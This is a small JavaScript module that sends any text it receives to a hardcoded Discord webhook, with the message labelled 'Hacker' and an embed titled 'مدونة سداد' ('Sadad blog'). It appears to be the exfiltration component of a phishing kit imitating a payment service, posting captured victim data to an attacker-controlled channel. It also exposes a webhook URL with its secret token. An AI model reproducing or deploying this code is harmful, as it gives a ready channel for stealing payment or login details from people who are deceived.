import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323516788134117428/9CrlaWWSJaGE43Fs3T_zkQ3zopYj2v0jkwZ3nOrrMN0ppyBW1Pmk70nYJ0covr-eCAmw",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
